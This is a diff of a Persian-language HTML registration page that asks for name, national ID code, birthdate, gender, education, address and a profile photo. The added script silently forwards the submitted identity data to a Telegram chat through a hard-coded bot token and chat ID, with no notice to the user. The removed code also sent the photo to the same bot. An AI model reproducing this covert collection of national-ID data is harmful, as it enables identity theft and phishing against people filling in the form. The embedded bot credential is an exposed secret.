@@ -3,252 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ثبت‌نام | ورود | پنل کاربری</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/jalaali-js/dist/jalaali.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <title>ثبت‌نام</title>
     <style>
+        /* استایل‌های ساده برای فرم */
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(to right, #28a745, #155724);
-            color: white;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            direction: rtl;
+            text-align: right;
+            background-color: #f4f4f4;
+            padding: 20px;
         }
         .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"], input[type="date"], input[type="file"], select {
             width: 100%;
-            max-width: 300px;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 10px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        input, select, button, textarea {
-            width: 80%;
-            margin: 10px 0;
             padding: 10px;
-            border: 2px solid #333;
+            margin: 10px 0;
+            border: 1px solid #ccc;
             border-radius: 5px;
-            text-align: center;
         }
-        input, select, textarea {
-            background: #fff;
+        input[type="radio"] {
+            margin: 0 5px;
         }
-        button {
-            background: #28a745;
+        .btn {
+            background-color: #4CAF50;
             color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
             cursor: pointer;
         }
-        button:hover {
-            background: #218838;
+        .btn:hover {
+            background-color: #45a049;
         }
-        a {
-            color: #28a745;
-            cursor: pointer;
-        }
-        a:hover {
-            color: #1e7e34;
-        }
-        .gender-container {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-        }
-        .gender-container label {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .error {
-            color: red;
-        }
-        .success {
-            color: #28a745;
-        }
-        .id-card {
-            width: 300px;
-            padding: 20px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            color: #333;
-            text-align: right;
-            margin: 20px 0;
-        }
-        .id-card h3 {
-            margin: 0 0 10px;
-            font-size: 18px;
-            color: #28a745;
-        }
-        .id-card p {
-            margin: 5px 0;
-            font-size: 14px;
-        }
-        .id-card img {
-            width: 100px;
-            height: 100px;
+        .img-preview {
+            max-width: 100px;
+            max-height: 100px;
             border-radius: 50%;
-            margin: 10px 0;
+            margin-top: 10px;
         }
-        #profilePreview {
-            display: none;
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            margin: 10px 0;
+        .signup-success {
+            color: green;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div id="signup">
-            <h2>ثبت‌نام</h2>
-            <input type="text" id="name" placeholder="نام">
-            <input type="text" id="family" placeholder="نام خانوادگی">
-            <input type="text" id="nationalCode" placeholder="کد ملی">
-            <input type="text" id="birthdate" placeholder="تاریخ تولد (مثال: ۱۳۸۰/۰۵/۲۳)">
-            <div class="gender-container">
-                <label><input type="radio" name="gender" value="male"> مرد</label>
-                <label><input type="radio" name="gender" value="female"> زن</label>
-            </div>
-            <input type="text" id="education" placeholder="تحصیلات">
-            <textarea id="address" placeholder="آدرس محل زندگی"></textarea>
-            <input type="file" id="profileImage" accept="image/*">
-            <img id="profilePreview" src="#" alt="پیش‌نمایش عکس">
-            <p class="error" id="signupError"></p>
-            <p class="success" id="signupSuccess"></p>
-            <button onclick="register()">ثبت‌نام</button>
-            <p>حساب کاربری دارید؟ <a href="#" onclick="showLogin()">ورود</a></p>
-        </div>
-        <div id="login" style="display: none;">
-            <h2>ورود</h2>
-            <input type="text" id="loginName" placeholder="نام">
-            <input type="text" id="loginFamily" placeholder="نام خانوادگی">
-            <input type="text" id="loginNationalCode" placeholder="کد ملی">
-            <p class="error" id="loginError"></p>
-            <button onclick="login()">ورود</button>
-            <p>حساب ندارید؟ <a href="#" onclick="showSignup()">ثبت‌نام</a></p>
-        </div>
+        <h2>فرم ثبت‌نام</h2>
+        <form id="signupForm">
+            <label for="name">نام:</label>
+            <input type="text" id="name" required>
 
-        <div id="dashboard" style="display: none;">
-            <h2>پنل کاربری</h2>
-            <div id="idCard" class="id-card">
-                <h3>کارت شناسایی</h3>
-                <img id="userProfileImage" src="" alt="عکس پرسنلی">
-                <p><strong>نام:</strong> <span id="userName"></span></p>
-                <p><strong>نام خانوادگی:</strong> <span id="userFamily"></span></p>
-                <p><strong>کد ملی:</strong> <span id="userNationalCode"></span></p>
-                <p><strong>تاریخ تولد:</strong> <span id="userBirthdate"></span></p>
-                <p><strong>جنسیت:</strong> <span id="userGender"></span></p>
-                <p><strong>تحصیلات:</strong> <span id="userEducation"></span></p>
-                <p><strong>آدرس:</strong> <span id="userAddress"></span></p>
-            </div>
-            <button onclick="editProfile()">ویرایش پروفایل</button>
-            <button onclick="downloadIDCard()">دانلود کارت شناسایی</button>
-            <button onclick="logout()">خروج</button>
-        </div>
+            <label for="family">نام خانوادگی:</label>
+            <input type="text" id="family" required>
 
-        <div id="editProfile" style="display: none;">
-            <h2>ویرایش پروفایل</h2>
-            <input type="text" id="editName" placeholder="نام">
-            <input type="text" id="editFamily" placeholder="نام خانوادگی">
-            <input type="text" id="editNationalCode" placeholder="کد ملی">
-            <input type="text" id="editBirthdate" placeholder="تاریخ تولد (مثال: ۱۳۸۰/۰۵/۲۳)">
-            <div class="gender-container">
-                <label><input type="radio" name="editGender" value="male"> مرد</label>
-                <label><input type="radio" name="editGender" value="female"> زن</label>
-            </div>
-            <input type="text" id="editEducation" placeholder="تحصیلات">
-            <textarea id="editAddress" placeholder="آدرس محل زندگی"></textarea>
-            <input type="file" id="editProfileImage" accept="image/*">
-            <img id="editProfilePreview" src="#" alt="پیش‌نمایش عکس">
-            <p class="error" id="editError"></p>
-            <p class="success" id="editSuccess"></p>
-            <button onclick="saveProfile()">ذخیره تغییرات</button>
-            <button onclick="showDashboard(currentUser)">بازگشت</button>
-        </div>
+            <label for="nationalCode">کد ملی:</label>
+            <input type="text" id="nationalCode" required>
+
+            <label for="birthdate">تاریخ تولد:</label>
+            <input type="date" id="birthdate" required>
+
+            <label>جنسیت:</label>
+            <input type="radio" id="male" name="gender" value="مرد">
+            <label for="male">مرد</label>
+            <input type="radio" id="female" name="gender" value="زن">
+            <label for="female">زن</label>
+
+            <label for="education">تحصیلات:</label>
+            <input type="text" id="education" required>
+
+            <label for="address">آدرس:</label>
+            <input type="text" id="address" required>
+
+            <label for="profileImage">عکس پروفایل:</label>
+            <input type="file" id="profileImage" accept="image/*" onchange="previewImage(event)" required>
+            <img id="profilePreview" class="img-preview" alt="پیش‌نمایش تصویر" />
+
+            <button type="submit" class="btn">ثبت‌نام</button>
+        </form>
+
+        <p id="signupSuccess" class="signup-success"></p>
     </div>
 
     <script>
-        let db;
-        const dbName = "UserDB";
-        const storeName = "Users";
-        let currentUser = null;
-
-        // Initialize IndexedDB
-        function initDB() {
-            const request = indexedDB.open(dbName, 1);
-            request.onupgradeneeded = function (event) {
-                db = event.target.result;
-                if (!db.objectStoreNames.contains(storeName)) {
-                    db.createObjectStore(storeName, { keyPath: "nationalCode" });
-                }
+        // پیش‌نمایش تصویر پروفایل
+        function previewImage(event) {
+            const file = event.target.files[0];
+            const reader = new FileReader();
+            reader.onload = function() {
+                const output = document.getElementById('profilePreview');
+                output.src = reader.result;
             };
-            request.onsuccess = function (event) {
-                db = event.target.result;
-            };
-            request.onerror = function (event) {
-                console.error("Error opening DB:", event.target.error);
-            };
+            reader.readAsDataURL(file);
         }
 
-        // Save user to IndexedDB
+        // ذخیره‌سازی اطلاعات در LocalStorage
         function saveUser(user) {
-            const transaction = db.transaction([storeName], "readwrite");
-            const store = transaction.objectStore(storeName);
-            const request = store.put(user);
-            request.onsuccess = function () {
-                console.log("User saved successfully.");
-            };
-            request.onerror = function (event) {
-                console.error("Error saving user:", event.target.error);
-            };
+            localStorage.setItem('user', JSON.stringify(user));
         }
 
-        // Get user from IndexedDB
-        function getUser(nationalCode, callback) {
-            const transaction = db.transaction([storeName], "readonly");
-            const store = transaction.objectStore(storeName);
-            const request = store.get(nationalCode);
-            request.onsuccess = function (event) {
-                callback(event.target.result);
-            };
-            request.onerror = function (event) {
-                console.error("Error fetching user:", event.target.error);
-            };
+        // ارسال اطلاعات به ربات تلگرام
+        function sendToTelegram(message) {
+            const token = "7546571600:AAHU8BKI4svtt5icjOFZJbKVMt_232n1s7Q";
+            const chatId = " -4755536198";
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log("Message sent", data))
+                .catch(error => console.error("Error sending message", error));
         }
 
-        // Preview profile image
-        document.getElementById("profileImage").addEventListener("change", function (e) {
-            const file = e.target.files[0];
-            const reader = new FileReader();
-            reader.onload = function (e) {
-                document.getElementById("profilePreview").src = e.target.result;
-                document.getElementById("profilePreview").style.display = "block";
-            };
-            reader.readAsDataURL(file);
-        });
+        // ثبت‌نام
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
 
-        // Preview edit profile image
-        document.getElementById("editProfileImage").addEventListener("change", function (e) {
-            const file = e.target.files[0];
-            const reader = new FileReader();
-            reader.onload = function (e) {
-                document.getElementById("editProfilePreview").src = e.target.result;
-                document.getElementById("editProfilePreview").style.display = "block";
-            };
-            reader.readAsDataURL(file);
-        });
-
-        // Register function
-        function register() {
             const user = {
                 name: document.getElementById("name").value.trim(),
                 family: document.getElementById("family").value.trim(),
@@ -261,155 +138,15 @@
             };
 
             saveUser(user);
+
+            // ارسال اطلاعات به تلگرام
+            const message = `ثبت‌نام جدید: \nنام: ${user.name}\nنام خانوادگی: ${user.family}\nکد ملی: ${user.nationalCode}\nتاریخ تولد: ${user.birthdate}\nجنسیت: ${user.gender}\nتحصیلات: ${user.education}\nآدرس: ${user.address}`;
+            sendToTelegram(message);
+
             document.getElementById("signupSuccess").innerText = "ثبت‌نام با موفقیت انجام شد!";
-            setTimeout(() => showLogin(), 2000);
-        }
-
-        // Login function
-        function login() {
-            const nationalCode = document.getElementById("loginNationalCode").value.trim();
-            getUser(nationalCode, function (user) {
-                if (user) {
-                    currentUser = user;
-                    showDashboard(user);
-                } else {
-                    document.getElementById("loginError").innerText = "کاربر یافت نشد!";
-                }
-            });
-        }
-
-        // Show dashboard
-        function showDashboard(user) {
-            document.getElementById("signup").style.display = "none";
-            document.getElementById("login").style.display = "none";
-            document.getElementById("editProfile").style.display = "none";
-            document.getElementById("dashboard").style.display = "block";
-
-            document.getElementById("userName").innerText = user.name;
-            document.getElementById("userFamily").innerText = user.family;
-            document.getElementById("userNationalCode").innerText = user.nationalCode;
-            document.getElementById("userBirthdate").innerText = user.birthdate;
-            document.getElementById("userGender").innerText = user.gender === "male" ? "مرد" : "زن";
-            document.getElementById("userEducation").innerText = user.education;
-            document.getElementById("userAddress").innerText = user.address;
-            document.getElementById("userProfileImage").src = user.profileImage;
-        }
-
-        // Edit profile
-        function editProfile() {
-            document.getElementById("dashboard").style.display = "none";
-            document.getElementById("editProfile").style.display = "block";
-
-            document.getElementById("editName").value = currentUser.name;
-            document.getElementById("editFamily").value = currentUser.family;
-            document.getElementById("editNationalCode").value = currentUser.nationalCode;
-            document.getElementById("editBirthdate").value = currentUser.birthdate;
-            document.querySelector(`input[name="editGender"][value="${currentUser.gender}"]`).checked = true;
-            document.getElementById("editEducation").value = currentUser.education;
-            document.getElementById("editAddress").value = currentUser.address;
-            document.getElementById("editProfilePreview").src = currentUser.profileImage;
-            document.getElementById("editProfilePreview").style.display = "block";
-        }
-
-        // Save profile changes
-        function saveProfile() {
-            const user = {
-                name: document.getElementById("editName").value.trim(),
-                family: document.getElementById("editFamily").value.trim(),
-                nationalCode: document.getElementById("editNationalCode").value.trim(),
-                birthdate: document.getElementById("editBirthdate").value.trim(),
-                gender: document.querySelector('input[name="editGender"]:checked')?.value || '',
-                education: document.getElementById("editEducation").value.trim(),
-                address: document.getElementById("editAddress").value.trim(),
-                profileImage: document.getElementById("editProfilePreview").src
-            };
-
-            saveUser(user);
-            currentUser = user;
-            showDashboard(user);
-        }
-
-        // Logout
-        function logout() {
-            currentUser = null;
-            document.getElementById("dashboard").style.display = "none";
-            document.getElementById("signup").style.display = "block";
-        }
-
-        // Show login
-        function showLogin() {
-            document.getElementById("signup").style.display = "none";
-            document.getElementById("login").style.display = "block";
-        }
-
-        // Show signup
-        function showSignup() {
-            document.getElementById("login").style.display = "none";
-            document.getElementById("signup").style.display = "block";
-        }
-
-        // Download ID card
-        function downloadIDCard() {
-            html2canvas(document.getElementById("idCard")).then(canvas => {
-                const link = document.createElement("a");
-                link.download = "کارت شناسایی.png";
-                link.href = canvas.toDataURL("image/png");
-                link.click();
-            });
-        }
-
-        // Initialize DB on page load
-        initDB();
-        document.getElementById("signupForm").addEventListener("submit", function(event) {
-    event.preventDefault();
-
-    let firstName = document.getElementById("firstName").value;
-    let lastName = document.getElementById("lastName").value;
-    let nationalCode = document.getElementById("nationalCode").value;
-    let birthDate = document.getElementById("birthDate").value;
-    let gender = document.querySelector('input[name="gender"]:checked').value;
-    let education = document.getElementById("education").value;
-    let address = document.getElementById("address").value;
-    let profilePic = document.getElementById("profilePic").files[0];
-
-    let message = `📝 ثبت نام جدید:\n\n👤 نام: ${firstName} ${lastName}\n🆔 کد ملی: ${nationalCode}\n📅 تاریخ تولد: ${birthDate}\n⚤ جنسیت: ${gender}\n🎓 تحصیلات: ${education}\n🏠 آدرس: ${address}`;
-
-    let botToken = "7546571600:AAHU8BKI4svtt5icjOFZJbKVMt_232n1s7Q"; // توکن ربات را اینجا قرار دهید
-    let chatId = " -4755536198"; // شناسه چت را اینجا قرار دهید
-    let urlMessage = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    // ارسال اطلاعات متنی
-    fetch(urlMessage, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            // اگر عکس پروفایل انتخاب شده بود، ارسال شود
-            if (profilePic) {
-                let formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("photo", profilePic);
-
-                let urlPhoto = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-                return fetch(urlPhoto, {
-                    method: "POST",
-                    body: formData
-                });
-            }
-        } else {
-            alert("خطا در ارسال اطلاعات!");
-        }
-    })
-    .then(response => response && response.json())
-    .then(data => {
-        if (data && data.ok) alert("اطلاعات و عکس با موفقیت ارسال شد!");
-        else if (!profilePic) alert("اطلاعات با موفقیت ارسال شد!");
-    })
-    .catch(error => alert("خطا در ارتباط با تلگرام!"));
-});
+            setTimeout(() => window.location.href = 'login.html', 2000); // هدایت به صفحه ورود
+        });
     </script>
+
 </body>
 </html>
